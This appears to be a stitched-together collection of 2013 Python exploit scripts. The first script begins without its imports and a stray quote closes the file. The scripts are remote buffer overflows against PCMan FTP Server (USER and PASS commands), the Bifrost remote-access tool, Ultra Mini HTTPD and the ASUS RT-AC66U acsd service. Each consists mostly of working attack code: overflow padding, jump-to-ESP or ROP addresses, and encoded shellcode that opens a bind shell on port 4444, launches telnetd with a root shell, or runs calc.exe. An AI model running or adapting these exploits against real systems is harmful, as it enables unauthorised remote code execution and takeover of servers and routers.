# Tested Commands*************USER (Other commands were not tested and may be vulnerable) 
# CVE**************************PCMan FTP Server v2.0.7 Buffer Overflow: Pending
#


def sigHandle(signum, frm): # Signal handler
    
    print "\n[!!!] Cleaning up the exploit... [!!!]\n"
    sleep(1)
    exit(0)


def targServer():
    
    while True:    
        try:
            server = inet_aton(raw_input("\n[*] Please enter the IPv4 address of the PCMan FTP Server:\n\n>"))
            server = inet_ntoa(server)
            break
        except:
            print "\n\n[!!!] Error: Please enter a valid IPv4 address. [!!!]\n\n"
            sleep(1)
            continue
            
    return server   


def main():
      
    print ("""\n [*] Title************************PCMan FTP Server v2.0.7 Remote Root Shell Exploit - USER Command
 [*] Discovered and Reported******June 2013 
 [*] Discovered/Exploited By******Jacob Holcomb/Gimppy, Security Analyst @ Independent Security Evaluators
 [*] Exploit/Advisory*************http://infosec42.blogspot.com/
 [*] Software*********************PCMan FTP Server v2.0.7 (Listens on TCP/21)
 [*] Tested Commands*************USER (Other commands were not tested and may be vulnerable) 
 [*] CVE**************************PCMan FTP Server v2.0.7 Buffer Overflow: Pending""")
    signal.signal(signal.SIGINT, sigHandle) #Setting signal handler for ctrl + c
    victim = targServer()
    port = int(21)
    Cmd = "USER " #Vulnerable command
    JuNk = "\x42" * 2004
    # KERNEL32.dll 7CA58265 - JMP ESP
    ret = "\x65\x82\xA5\x7C"    
    NOP = "\x90" * 50

    #348 Bytes Bind Shell Port TCP/4444
    #msfpayload windows/shell_bind_tcp EXITFUNC=thread LPORT=4444 R | 
    #msfencode -e x86/shikata_ga_nai -c 1 -b "\x0d\x0a\x00\xf1" R
    shellcode = "\xdb\xcc\xba\x40\xb6\x7d\xba\xd9\x74\x24\xf4\x58\x29\xc9"
    shellcode += "\xb1\x50\x31\x50\x18\x03\x50\x18\x83\xe8\xbc\x54\x88\x46"
    shellcode += "\x56\x72\x3e\x5f\x5f\x7b\x3e\x60\xff\x0f\xad\xbb\xdb\x84"
    shellcode += "\x6b\xf8\xa8\xe7\x76\x78\xaf\xf8\xf2\x37\xb7\x8d\x5a\xe8"
    shellcode += "\xc6\x7a\x2d\x63\xfc\xf7\xaf\x9d\xcd\xc7\x29\xcd\xa9\x08"
    shellcode += "\x3d\x09\x70\x42\xb3\x14\xb0\xb8\x38\x2d\x60\x1b\xe9\x27"
    shellcode += "\x6d\xe8\xb6\xe3\x6c\x04\x2e\x67\x62\x91\x24\x28\x66\x24"
    shellcode += "\xd0\xd4\xba\xad\xaf\xb7\xe6\xad\xce\x84\xd7\x16\x74\x80"
    shellcode += "\x54\x99\xfe\xd6\x56\x52\x70\xcb\xcb\xef\x31\xfb\x4d\x98"
    shellcode += "\x3f\xb5\x7f\xb4\x10\xb5\xa9\x22\xc2\x2f\x3d\x98\xd6\xc7"
    shellcode += "\xca\xad\x24\x47\x60\xad\x99\x1f\x43\xbc\xe6\xdb\x03\xc0"
    shellcode += "\xc1\x43\x2a\xdb\x88\xfa\xc1\x2c\x57\xa8\x73\x2f\xa8\x82"
    shellcode += "\xeb\xf6\x5f\xd6\x46\x5f\x9f\xce\xcb\x33\x0c\xbc\xb8\xf0"
    shellcode += "\xe1\x01\x6d\x08\xd5\xe0\xf9\xe7\x8a\x8a\xaa\x8e\xd2\xc6"
    shellcode += "\x24\x35\x0e\x99\x73\x62\xd0\x8f\x11\x9d\x7f\x65\x1a\x4d"
    shellcode += "\x17\x21\x49\x40\x01\x7e\x6e\x4b\x82\xd4\x6f\xa4\x4d\x32"
    shellcode += "\xc6\xc3\xc7\xeb\x27\x1d\x87\x47\x83\xf7\xd7\xb8\xb8\x90"
    shellcode += "\xc0\x40\x78\x19\x58\x4c\x52\x8f\x99\x62\x3c\x5a\x02\xe5"
    shellcode += "\xa8\xf9\xa7\x60\xcd\x94\x67\x2a\x24\xa5\x01\x2b\x5c\x71"
    shellcode += "\x9b\x56\x91\xb9\x68\x3c\x2f\x7b\xa2\xbf\x8d\x50\x2f\xb2"
    shellcode += "\x6b\x91\xe4\x66\x20\x89\x88\x86\x85\x5c\x92\x02\xad\x9f"
    shellcode += "\xba\xb6\x7a\x32\x12\x18\xd5\xd8\x95\xcb\x84\x49\xc7\x14"
    shellcode += "\xf6\x1a\x4a\x33\xf3\x14\xc7\x3b\x2d\xc2\x17\x3c\xe6\xec"
    shellcode += "\x38\x48\x5f\xef\x3a\x8b\x3b\xf0\xeb\x46\x3c\xde\x7c\x88"
    shellcode += "\x0c\x3f\x1c\x05\x6f\x16\x22\x79"

    sploit = Cmd + JuNk + ret + NOP + shellcode
    sploit += "\x42" * (2992 - len(NOP + shellcode)) + "\r\n"

    try:
        print "\n [*] Creating network socket."
        net_sock = socket(AF_INET, SOCK_STREAM)
    except:
        print "\n [!!!] There was an error creating the network socket. [!!!]\n\n%s\n" % exc_info()       
        sleep(1)
        exit(0)    

    try:
        print " [*] Connecting to PCMan FTP Server @ %s on port TCP/%d." % (victim, port)
        net_sock.connect((victim, port))
    except:
        print "\n [!!!] There was an error connecting to %s. [!!!]\n\n%s\n" % (victim, exc_info())
        sleep(1)
        exit(0)
 
    try:
        print """ [*] Attempting to exploit the FTP USER command.
 [*] Sending 1337 ro0t Sh3ll exploit to %s on TCP port %d.
 [*] Payload Length: %d bytes.""" % (victim, port, len(sploit))
        net_sock.send(sploit)
        sleep(1)
    except:
        print "\n [!!!] There was an error sending the 1337 ro0t Sh3ll exploit to %s [!!!]\n\n%s\n" % (victim, exc_info())
        sleep(1)
        exit(0)

    try:
        print """ [*] 1337 ro0t Sh3ll exploit was sent! Fingers crossed for code execution!
 [*] Closing network socket. Press ctrl + c repeatedly to force exploit cleanup.\n"""
        net_sock.close()
    except:
        print "\n [!!!] There was an error closing the network socket. [!!!]\n\n%s\n" % exc_info()
        sleep(1)
        exit(0)


if __name__ == "__main__":
    main()
#!/usr/bin/python2.7
#By : Mohamed Clay
import socket
from time import sleep
from itertools import izip, cycle
import base64
import sys

def rc4crypt(data, key):
    x = 0
    box = range(256)
    for i in range(256):
        x = (x + box[i] + ord(key[i % len(key)])) % 256
        box[i], box[x] = box[x], box[i]
    x = 0
    y = 0
    out = []
    for char in data:
        x = (x + 1) % 256
        y = (y + box[x]) % 256
        box[x], box[y] = box[y], box[x]
        out.append(chr(ord(char) ^ box[(box[x] + box[y]) % 256]))
    
    return ''.join(out)

def bif_len(s):
    while len(s)<8:
         s=s+"00"
    return s

def header(s):
      a=(s[0]+s[1]).decode("hex")
      a+=(s[2]+s[3]).decode("hex")
      a+=(s[4]+s[5]).decode("hex")
      a+=(s[5]+s[6]).decode("hex")
      return a

def random():     
    a="" 
    for i in range(0,8):
        a+="A"*1000+"|"
    return a

def usage():

   print "\n\n\t***************************"
   print "\t*    By : Mohamed Clay    *"
   print "\t*  Bifrost 1.2.1 Exploit  *"
   print "\t***************************\n"
   print "\t  Usage : ./bifrost1.2.1 host port"
   print "\tExample : ./bifrost1.2.1 192.168.1.10 81\n\n"


if len(sys.argv)!=3:
    usage()
    exit()

HOST=sys.argv[1]
PORT=int(sys.argv[2])

key="\xA3\x78\x26\x35\x57\x32\x2D\x60\xB4\x3C\x2A\x5E\x33\x34\x72\x00"

xor="\xB2\x9C\x51\xBB" # we need this in order to bypass 0046A03E function
eip="\x53\x93\x3A\x7E" # jmp esp User32.dll

egghunter = "\x66\x81\xCA\xFF\x0F\x42\x52\x6A\x02\x58\xCD\x2E\x3C\x05\x5A\x74\xEF\xB8\x77\x30\x30\x74\x8B\xFA\xAF\x75\xEA\xAF\x75\xE7\xFF\xE7";

#calc.exe shellcode (badchars "\x00")

buf ="\xb8\x75\xd3\x5c\x87\xd9\xee\xd9\x74\x24\xf4\x5b\x31\xc9" 
buf +="\xb1\x33\x31\x43\x12\x83\xeb\xfc\x03\x36\xdd\xbe\x72\x44" 
buf +="\x09\xb7\x7d\xb4\xca\xa8\xf4\x51\xfb\xfa\x63\x12\xae\xca" 
buf +="\xe0\x76\x43\xa0\xa5\x62\xd0\xc4\x61\x85\x51\x62\x54\xa8" 
buf +="\x62\x42\x58\x66\xa0\xc4\x24\x74\xf5\x26\x14\xb7\x08\x26" 
buf +="\x51\xa5\xe3\x7a\x0a\xa2\x56\x6b\x3f\xf6\x6a\x8a\xef\x7d" 
buf +="\xd2\xf4\x8a\x41\xa7\x4e\x94\x91\x18\xc4\xde\x09\x12\x82" 
buf +="\xfe\x28\xf7\xd0\xc3\x63\x7c\x22\xb7\x72\x54\x7a\x38\x45" 
buf +="\x98\xd1\x07\x6a\x15\x2b\x4f\x4c\xc6\x5e\xbb\xaf\x7b\x59" 
buf +="\x78\xd2\xa7\xec\x9d\x74\x23\x56\x46\x85\xe0\x01\x0d\x89" 
buf +="\x4d\x45\x49\x8d\x50\x8a\xe1\xa9\xd9\x2d\x26\x38\x99\x09" 
buf +="\xe2\x61\x79\x33\xb3\xcf\x2c\x4c\xa3\xb7\x91\xe8\xaf\x55" 
buf +="\xc5\x8b\xed\x33\x18\x19\x88\x7a\x1a\x21\x93\x2c\x73\x10" 
buf +="\x18\xa3\x04\xad\xcb\x80\xfb\xe7\x56\xa0\x93\xa1\x02\xf1" 
buf +="\xf9\x51\xf9\x35\x04\xd2\x08\xc5\xf3\xca\x78\xc0\xb8\x4c" 
buf +="\x90\xb8\xd1\x38\x96\x6f\xd1\x68\xf5\xee\x41\xf0\xd4\x95" 
buf +="\xe1\x93\x28"


raw=(1000-533-len(egghunter))*"\x90"
raw2=(1000-8-len(buf))*"\x41"+"|"
command=30

tmp=hex(command).split("0x")[1]
data=tmp.decode("hex")+"F"*2+" "*511+xor+"C"*8+eip+"A"*12+egghunter+raw+"|"+" "*1000+"|"+"w00tw00t"+buf+raw2+random()
out=rc4crypt(data,key)
l=header(bif_len(str(hex(len(data))).split("0x")[1]))
out=l+out
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
s.sendall(out)
print "\n[*] By : Mohamed Clay"
print "[*] Exploit completed\n"





#!/usr/bin/python2.7
#By : Mohamed Clay
import socket
from time import sleep
from itertools import izip, cycle
import base64
import threading
import sys

def rc4crypt(data, key):
    x = 0
    box = range(256)
    for i in range(256):
        x = (x + box[i] + ord(key[i % len(key)])) % 256
        box[i], box[x] = box[x], box[i]
    x = 0
    y = 0
    out = []
    for char in data:
        x = (x + 1) % 256
        y = (y + box[x]) % 256
        box[x], box[y] = box[y], box[x]
        out.append(chr(ord(char) ^ box[(box[x] + box[y]) % 256]))
    
    return ''.join(out)

def bif_len(s):
    while len(s)<8:
         s=s+"00"
    return s

def header(s):
      a=(s[0]+s[1]).decode("hex")
      a+=(s[2]+s[3]).decode("hex")
      a+=(s[4]+s[5]).decode("hex")
      a+=(s[5]+s[6]).decode("hex")
      return a

def random():     
    a="" 
    for i in range(0,8):
        a+="A"*1000+"|"
    return a


def exploit():
    s.sendall(out)

def usage():

   print "\n\n\t***************************"
   print "\t*    By : Mohamed Clay    *"
   print "\t*  Bifrost 1.2d Exploit  *"
   print "\t***************************\n"
   print "\t  Usage : ./bifrost1.2.1 host port"
   print "\tExample : ./bifrost1.2.1 192.168.1.10 81\n\n"


if len(sys.argv)!=3:
    usage()
    exit()

HOST=sys.argv[1]
PORT=int(sys.argv[2])

key="\xA3\x78\x26\x35\x57\x32\x2D\x60\xB4\x3C\x2A\x5E\x33\x34\x72\x00"

xor="\xB2\x9C\x51\xBB" # we need this in order to bypass 0046A03E function
eip="\x53\x93\x3A\x7E" # jmp esp User32.dll

egghunter = "\x66\x81\xCA\xFF\x0F\x42\x52\x6A\x02\x58\xCD\x2E\x3C\x05\x5A\x74\xEF\xB8\x77\x30\x30\x74\x8B\xFA\xAF\x75\xEA\xAF\x75\xE7\xFF\xE7";

#calc.exe shellcode (badchars "\x00")

buf ="\xb8\x75\xd3\x5c\x87\xd9\xee\xd9\x74\x24\xf4\x5b\x31\xc9" 
buf +="\xb1\x33\x31\x43\x12\x83\xeb\xfc\x03\x36\xdd\xbe\x72\x44" 
buf +="\x09\xb7\x7d\xb4\xca\xa8\xf4\x51\xfb\xfa\x63\x12\xae\xca" 
buf +="\xe0\x76\x43\xa0\xa5\x62\xd0\xc4\x61\x85\x51\x62\x54\xa8" 
buf +="\x62\x42\x58\x66\xa0\xc4\x24\x74\xf5\x26\x14\xb7\x08\x26" 
buf +="\x51\xa5\xe3\x7a\x0a\xa2\x56\x6b\x3f\xf6\x6a\x8a\xef\x7d" 
buf +="\xd2\xf4\x8a\x41\xa7\x4e\x94\x91\x18\xc4\xde\x09\x12\x82" 
buf +="\xfe\x28\xf7\xd0\xc3\x63\x7c\x22\xb7\x72\x54\x7a\x38\x45" 
buf +="\x98\xd1\x07\x6a\x15\x2b\x4f\x4c\xc6\x5e\xbb\xaf\x7b\x59" 
buf +="\x78\xd2\xa7\xec\x9d\x74\x23\x56\x46\x85\xe0\x01\x0d\x89" 
buf +="\x4d\x45\x49\x8d\x50\x8a\xe1\xa9\xd9\x2d\x26\x38\x99\x09" 
buf +="\xe2\x61\x79\x33\xb3\xcf\x2c\x4c\xa3\xb7\x91\xe8\xaf\x55" 
buf +="\xc5\x8b\xed\x33\x18\x19\x88\x7a\x1a\x21\x93\x2c\x73\x10" 
buf +="\x18\xa3\x04\xad\xcb\x80\xfb\xe7\x56\xa0\x93\xa1\x02\xf1" 
buf +="\xf9\x51\xf9\x35\x04\xd2\x08\xc5\xf3\xca\x78\xc0\xb8\x4c" 
buf +="\x90\xb8\xd1\x38\x96\x6f\xd1\x68\xf5\xee\x41\xf0\xd4\x95" 
buf +="\xe1\x93\x28"


raw=(1000-533-len(egghunter))*"\x90"
raw2=(1000-8-len(buf))*"\x41"+"|"
command=30


tmp=hex(command).split("0x")[1]
data=tmp.decode("hex")+"F"*2+" "*511+xor+"C"*12+eip+"A"*8+egghunter+raw+"|"+" "*1000+"|"+"w00tw00t"+buf+raw2+random()
out=rc4crypt(data,key)
l=header(bif_len(str(hex(len(data))).split("0x")[1]))
out=l+out


data2="2192.168.1.1|Default|Mohamed Clay|Mohamed Clay|p1.2d||0|-1|0|0000|0|1|0|0|000000|C:\|C:\|C:\|MA|00000000|BifrosT v1.2d|"
out2=rc4crypt(data2,key)
l=header(bif_len(str(hex(len(data2))).split("0x")[1]))
out2=l+out2

th = threading.Thread(name='exploit', target=exploit)
th.setDaemon(True)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
s.sendall(out2)
th.start()
s.recv(1024)
print "\n[*] By : Mohamed Clay"
print "[*] Exploit completed\n"
#!/usr/bin/python
#
#
####################################################################
#
# Exploit Title: PCMan's FTP Server 2.0 Remote Buffer Overflow Exploit
# Date: 2013/6/26
# Exploit Author: Chako
# Vendor Homepage: http://pcman.openfoundry.org/
# Software Download Link: https://files.secureserver.net/1sMltFOsytirTG
# Version: 2.0
# Tested on: Windows 7 SP1 English
#
# EAX 00000000
# ECX 00830A70
# EDX 00000030
# EBX 00000000
# ESP 0018ED70 ASCII "AAAAAAAAAAAAAAAAAAAAA
# EBP 01F214A0
# ESI 0018ED87 ASCII "AAAAAAAAAAAAAAAAAAAAA
# EDI 00000004
# EIP 41414141
#
####################################################################

import socket
import sys

USER    = "anonymous"
PASSWD  = "TEST"

PAYLOAD = "\x41" * 2010
EIP     = "\xDB\xFC\x1C\x75"  # 751CFCDB   JMP ESP USER32.DLL
NOP     = "\x90" * 10

SHELLCODE =(
   "\xba\x38\xdc\x15\x77\xdd\xc7\xd9\x74\x24\xf4\x5d\x33\xc9"
   "\xb1\x33\x83\xc5\x04\x31\x55\x0e\x03\x6d\xd2\xf7\x82\x71"
   "\x02\x7e\x6c\x89\xd3\xe1\xe4\x6c\xe2\x33\x92\xe5\x57\x84"
   "\xd0\xab\x5b\x6f\xb4\x5f\xef\x1d\x11\x50\x58\xab\x47\x5f"
   "\x59\x1d\x48\x33\x99\x3f\x34\x49\xce\x9f\x05\x82\x03\xe1"
   "\x42\xfe\xec\xb3\x1b\x75\x5e\x24\x2f\xcb\x63\x45\xff\x40"
   "\xdb\x3d\x7a\x96\xa8\xf7\x85\xc6\x01\x83\xce\xfe\x2a\xcb"
   "\xee\xff\xff\x0f\xd2\xb6\x74\xfb\xa0\x49\x5d\x35\x48\x78"
   "\xa1\x9a\x77\xb5\x2c\xe2\xb0\x71\xcf\x91\xca\x82\x72\xa2"
   "\x08\xf9\xa8\x27\x8d\x59\x3a\x9f\x75\x58\xef\x46\xfd\x56"
   "\x44\x0c\x59\x7a\x5b\xc1\xd1\x86\xd0\xe4\x35\x0f\xa2\xc2"
   "\x91\x54\x70\x6a\x83\x30\xd7\x93\xd3\x9c\x88\x31\x9f\x0e"
   "\xdc\x40\xc2\x44\x23\xc0\x78\x21\x23\xda\x82\x01\x4c\xeb"
   "\x09\xce\x0b\xf4\xdb\xab\xe4\xbe\x46\x9d\x6c\x67\x13\x9c"
   "\xf0\x98\xc9\xe2\x0c\x1b\xf8\x9a\xea\x03\x89\x9f\xb7\x83"
   "\x61\xed\xa8\x61\x86\x42\xc8\xa3\xe5\x05\x5a\x2f\xc4\xa0"
   "\xda\xca\x18");

print("\n\n[+] PCMan's FTP Server 2.0 Rrmote Buffer Overflow Exploit")
print("[+] Version: V2.0")
print("[+] Chako\n\n\n")

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("127.0.0.1",21))
data = s.recv(1024)


print("[-] Login to FTP Server...\n")
s.send("USER " + USER + '\r\n')
data = s.recv(1024)

s.send("PASS " + PASSWD + '\r\n')
data = s.recv(1024)



print("[-] Sending exploit...\n")
s.send(PAYLOAD + EIP + NOP +SHELLCODE +'\r\n')
s.close()

print("[!] Done! Exploit successfully sent\n")
# Exploit Title: Ultra Mini HTTPD stack buffer overflow
# Date: 10 July 2013
# Exploit Author: superkojiman - http://www.techorganic.com
# Vendor Homepage: http://www.picolix.jp/
# Software Link: http://www.vector.co.jp/soft/winnt/net/se275154.html
# Version: 1.21
# Tested on: Windows XP Professional SP2, English
#
# Description: 
# A buffer overflow is triggered when requesting a very long 
# resource name. 
#

import socket
import struct

# msfpayload windows/shell_bind_tcp R | \
#     msfencode -b "\x00\x0a\x0d\x20\x0b\x09\x0c"
# [*] x86/shikata_ga_nai succeeded with size 368 (iteration=1)

shellcode = ( 
"\xba\x1f\xb5\xae\xa1\xdd\xc4\xd9\x74\x24\xf4\x5e\x33\xc9" +
"\xb1\x56\x31\x56\x13\x83\xc6\x04\x03\x56\x10\x57\x5b\x5d" +
"\xc6\x1e\xa4\x9e\x16\x41\x2c\x7b\x27\x53\x4a\x0f\x15\x63" +
"\x18\x5d\x95\x08\x4c\x76\x2e\x7c\x59\x79\x87\xcb\xbf\xb4" +
"\x18\xfa\x7f\x1a\xda\x9c\x03\x61\x0e\x7f\x3d\xaa\x43\x7e" +
"\x7a\xd7\xab\xd2\xd3\x93\x19\xc3\x50\xe1\xa1\xe2\xb6\x6d" +
"\x99\x9c\xb3\xb2\x6d\x17\xbd\xe2\xdd\x2c\xf5\x1a\x56\x6a" +
"\x26\x1a\xbb\x68\x1a\x55\xb0\x5b\xe8\x64\x10\x92\x11\x57" +
"\x5c\x79\x2c\x57\x51\x83\x68\x50\x89\xf6\x82\xa2\x34\x01" +
"\x51\xd8\xe2\x84\x44\x7a\x61\x3e\xad\x7a\xa6\xd9\x26\x70" +
"\x03\xad\x61\x95\x92\x62\x1a\xa1\x1f\x85\xcd\x23\x5b\xa2" +
"\xc9\x68\x38\xcb\x48\xd5\xef\xf4\x8b\xb1\x50\x51\xc7\x50" +
"\x85\xe3\x8a\x3c\x6a\xde\x34\xbd\xe4\x69\x46\x8f\xab\xc1" +
"\xc0\xa3\x24\xcc\x17\xc3\x1f\xa8\x88\x3a\x9f\xc9\x81\xf8" +
"\xcb\x99\xb9\x29\x73\x72\x3a\xd5\xa6\xd5\x6a\x79\x18\x96" +
"\xda\x39\xc8\x7e\x31\xb6\x37\x9e\x3a\x1c\x4e\x98\xf4\x44" +
"\x03\x4f\xf5\x7a\xb2\xd3\x70\x9c\xde\xfb\xd4\x36\x76\x3e" +
"\x03\x8f\xe1\x41\x61\xa3\xba\xd5\x3d\xad\x7c\xd9\xbd\xfb" +
"\x2f\x76\x15\x6c\xbb\x94\xa2\x8d\xbc\xb0\x82\xc4\x85\x53" +
"\x58\xb9\x44\xc5\x5d\x90\x3e\x66\xcf\x7f\xbe\xe1\xec\xd7" +
"\xe9\xa6\xc3\x21\x7f\x5b\x7d\x98\x9d\xa6\x1b\xe3\x25\x7d" +
"\xd8\xea\xa4\xf0\x64\xc9\xb6\xcc\x65\x55\xe2\x80\x33\x03" +
"\x5c\x67\xea\xe5\x36\x31\x41\xac\xde\xc4\xa9\x6f\x98\xc8" +
"\xe7\x19\x44\x78\x5e\x5c\x7b\xb5\x36\x68\x04\xab\xa6\x97" +
"\xdf\x6f\xd6\xdd\x7d\xd9\x7f\xb8\x14\x5b\xe2\x3b\xc3\x98" +
"\x1b\xb8\xe1\x60\xd8\xa0\x80\x65\xa4\x66\x79\x14\xb5\x02" +
"\x7d\x8b\xb6\x06"
)

# 7C941EED  , JMP ESP , ntdll.dll
payload =  "A" * 5392 + struct.pack("<I", 0x7C941EED)
payload += "\x81\xc4\xf0\xea\xff\xff" + shellcode + "B" * 4230

print "[+] sending payload, length", len(payload)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.37.175", 80))

buf = (
	"GET /" + payload + " HTTP/1.1\r\n" + 
	"Host: 192.168.37.175" + 
	"\r\n\r\n"
)

s.send(buf)
s.close()#!/usr/bin/env python

import signal, struct
from time import sleep
from socket import *
from sys import exit, exc_info

#
# Title*******************ASUS RT-AC66U Remote Root Shell Exploit - acsd param command
# Discovered and Reported*June 2013 
# Discovered/Exploited By*Jacob Holcomb/Gimppy and Jacob Thompson
#                        *Security Analsyts @ Independent Security Evaluators
# Software Vendor*********http://asus.com
# Exploit/Advisory********http://securityevaluators.com, http://infosec42.blogspot.com/
# Software****************acsd wireless service (Listens on TCP/5916)
# Firmware Version********3.0.0.4.266 (Other versions were not tested and may be vulnerable) 
# CVE*********************ASUS RT-AC66U Multiple Buffer Overflows: CVE-2013-4659
#
# Overview:
#	The ASUS RT-AC66U contains the Broadcom ACSD Wireless binary that is vulnerable to multiple 
#   Buffer Overflow attacks.
#
#   Multiple overflows exist in the following software:
#
#	- Broadcom acsd - Wireless Channel Service (autochannel&param, autochannel&data, csscan&ifname commands)
#														


def sigHandle(signum, frm): # Signal handler
    
    print "\n[!!!] Cleaning up the exploit... [!!!]\n"
    sleep(1)
    exit(0)


def targServer():
    
    while True:    
        try:
            server = inet_aton(raw_input("\n[*] Please enter the IPv4 address of the ASUS RT-AC66U router:\n\n>"))
            server = inet_ntoa(server)
            break
        except:
            print "\n\n[!!!] Error: Please enter a valid IPv4 address. [!!!]\n\n"
            sleep(1)
            continue
            
    return server   


def main():
      
    print ("""\n [*] Title: ASUS RT-AC66U Remote Root Shell Exploit - acsd param command
 [*] Discovered and Reported: June 2013
 [*] Discovered/Exploited By: Jacob Holcomb/Gimppy and Jacob Thompson, Security Analysts @ ISE
 [*] Software Vendor: http://asus.com
 [*] Exploit/Advisory: http://securityevaluators.com, http://infosec42.blogspot.com/
 [*] Software: acsd wireless service (Listens on TCP/5916)
 [*] Firmware Version: 3.0.0.4.266 (Other versions were not tested and may be vulnerable)
 [*] CVE: ASUS RT-AC66U Broadcom ACSD Buffer Overflow: CVE-2013-4659\n""")
    signal.signal(signal.SIGINT, sigHandle) #Setting signal handler for ctrl + c
    victim = targServer()
    port = int(5916)
    acsdCmd = "autochannel&param=" #Vulnerable command - JH
    
    # base address of .text section of libc.so.0 in acsd's address space
    libc_base = 0x2ab25000

    # ROP gadget #1
    # lui     s0,0x2
    # li      a0,1
    # move    t9,s1
    # jalr    t9
    # ori     a1,s0,0x2
    ra1 = struct.pack("<L", libc_base + 0x2d39c)

    # ROP gadget #2
    # move    t9,s3
    # lw      ra,44(sp)
    # lw      s4,40(sp)
    # lw      s3,36(sp)
    # lw      s2,32(sp)
    # lw      s1,28(sp)
    # lw      s0,24(sp)
    # jr      t9
    s1 = struct.pack("<L", libc_base + 0x34358)

    # sleep() - used to force program context switch (cache flush)
    s3 = struct.pack("<L", libc_base + 0x2cb90)

    # ROP gadget #3
    # addiu   a1,sp,24
    # lw      gp,16(sp)
    # lw      ra,32(sp)
    # jr      ra
    # addiu   sp,sp,40
    ra2 = struct.pack("<L", libc_base + 0xa1b0)

    # ROP gadget #4
    # move    t9,a1
    # addiu   a0,a0,56
    # jr      t9
    # move    a1,a2
    ra3 = struct.pack("<L", libc_base + 0x3167c)

    # jalr sp
    jalr_sp =  "\x09\xf8\xa0\x03"
    
    JuNk = "\x42" * 510
    safeNop = "2Aa3"

    #80 Bytes system() Shellcode by Jacob Holcomb of ISE
    #Calling system() and executing telnetd -l /bin/sh
    shellcode = "\x6c\x6e\x08\x3c\x74\x65\x08\x35\xec\xff\xa8"
    shellcode += "\xaf\x64\x20\x09\x3c\x65\x74\x29\x35\xf0\xff"
    shellcode += "\xa9\xaf\x20\x2f\x0a\x3c\x2d\x6c\x4a\x35\xf4"
    shellcode += "\xff\xaa\xaf\x6e\x2f\x0b\x3c\x62\x69\x6b\x35"
    shellcode += "\xf8\xff\xab\xaf\x73\x68\x0c\x24\xfc\xff\xac"
    shellcode += "\xaf\xec\xff\xa4\x23\xec\xff\xbd\x23\xb4\x2a"
    shellcode += "\x19\x3c\x50\xf0\x39\x37\x09\xf8\x20\x03\x32"
    shellcode += "\x41\x61\x33"

    sploit = acsdCmd + JuNk + s1 + JuNk[0:4] + s3 + ra1 + JuNk[0:48]
    sploit += ra2 + JuNk[0:24]+ jalr_sp + safeNop + ra3 + JuNk[0:4]
    sploit += safeNop + shellcode

    try:
        print "\n [*] Creating network socket."
        net_sock = socket(AF_INET, SOCK_STREAM)
    except:
        print "\n [!!!] There was an error creating the network socket. [!!!]\n\n%s\n" % exc_info()       
        sleep(1)
        exit(0)    

    try:
        print " [*] Connecting to ASUS RT-AC66U router @ %s on port TCP/%d." % (victim, port)
        net_sock.connect((victim, port))
    except:
        print "\n [!!!] There was an error connecting to %s. [!!!]\n\n%s\n" % (victim, exc_info())
        sleep(1)
        exit(0)
 
    try:
        print """ [*] Attempting to exploit the acsd param command.
 [*] Sending 1337 ro0t Sh3ll exploit to %s on TCP port %d.
 [*] Payload Length: %d bytes.""" % (victim, port, len(sploit))
        net_sock.send(sploit)
        sleep(1)
    except:
        print "\n [!!!] There was an error sending the 1337 ro0t Sh3ll exploit to %s [!!!]\n\n%s\n" % (victim, exc_info())
        sleep(1)
        exit(0)

    try:
        print """ [*] 1337 ro0t Sh3ll exploit was sent! Fingers crossed for code execution!
 [*] Closing network socket. Press ctrl + c repeatedly to force exploit cleanup.\n"""
        net_sock.close()
    except:
        print "\n [!!!] There was an error closing the network socket. [!!!]\n\n%s\n" % exc_info()
        sleep(1)
        exit(0)


if __name__ == "__main__":
    main()
#!/usr/bin/python2.7
# -*- coding: utf-8 -*-



"""
PCMAN FTPD 2.07 PASS Command Buffer Overflow
Author: Ottomatik
Date: 2013-07-31
Software : PCMAN FTPD
Version : 2.07
Tested On: Windows 7 SP1 - French;
Description:
    * The PASS Command is vulnerable to a buffer overflow;
    * Other commads may be vulnerable;
"""

# Modules import;

import socket

def main() :
    """
    Main function;
    """
    buf = "PASS "
    buf += "A" * 6102 # JUNK
    # 0x75670253
    buf += "\x53\x02\x67\x75" # @ CALL ESP Kernel32.dll
    buf += "\x90" * 40 # NOPs
    
    # ShellCode : msfpayload windows_exec calc.exe, bad chars = 00,0A,0C,0D

    buf +=("\xdd\xc5\xd9\x74\x24\xf4\x5a\x31\xc9\xb8\xd1\x96\xc1\xcb\xb1"
"\x33\x31\x42\x17\x83\xc2\x04\x03\x93\x85\x23\x3e\xef\x42\x2a"
"\xc1\x0f\x93\x4d\x4b\xea\xa2\x5f\x2f\x7f\x96\x6f\x3b\x2d\x1b"
"\x1b\x69\xc5\xa8\x69\xa6\xea\x19\xc7\x90\xc5\x9a\xe9\x1c\x89"
"\x59\x6b\xe1\xd3\x8d\x4b\xd8\x1c\xc0\x8a\x1d\x40\x2b\xde\xf6"
"\x0f\x9e\xcf\x73\x4d\x23\xf1\x53\xda\x1b\x89\xd6\x1c\xef\x23"
"\xd8\x4c\x40\x3f\x92\x74\xea\x67\x03\x85\x3f\x74\x7f\xcc\x34"
"\x4f\x0b\xcf\x9c\x81\xf4\xfe\xe0\x4e\xcb\xcf\xec\x8f\x0b\xf7"
"\x0e\xfa\x67\x04\xb2\xfd\xb3\x77\x68\x8b\x21\xdf\xfb\x2b\x82"
"\xde\x28\xad\x41\xec\x85\xb9\x0e\xf0\x18\x6d\x25\x0c\x90\x90"
"\xea\x85\xe2\xb6\x2e\xce\xb1\xd7\x77\xaa\x14\xe7\x68\x12\xc8"
"\x4d\xe2\xb0\x1d\xf7\xa9\xde\xe0\x75\xd4\xa7\xe3\x85\xd7\x87"
"\x8b\xb4\x5c\x48\xcb\x48\xb7\x2d\x23\x03\x9a\x07\xac\xca\x4e"
"\x1a\xb1\xec\xa4\x58\xcc\x6e\x4d\x20\x2b\x6e\x24\x25\x77\x28"
"\xd4\x57\xe8\xdd\xda\xc4\x09\xf4\xb8\x8b\x99\x94\x10\x2e\x1a"
"\x3e\x6d")
    buf += "\r\n"
    
    clt_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    clt_socket.connect(("127.0.0.1", 21))
    print clt_socket.recv(2048)
    clt_socket.send("USER anonymous\r\n")
    print clt_socket.recv(2048)
    clt_socket.send(buf)
    print clt_socket.recv(2048)
    clt_socket.close()
    


if __name__ == "__main__" :
    main()
"""
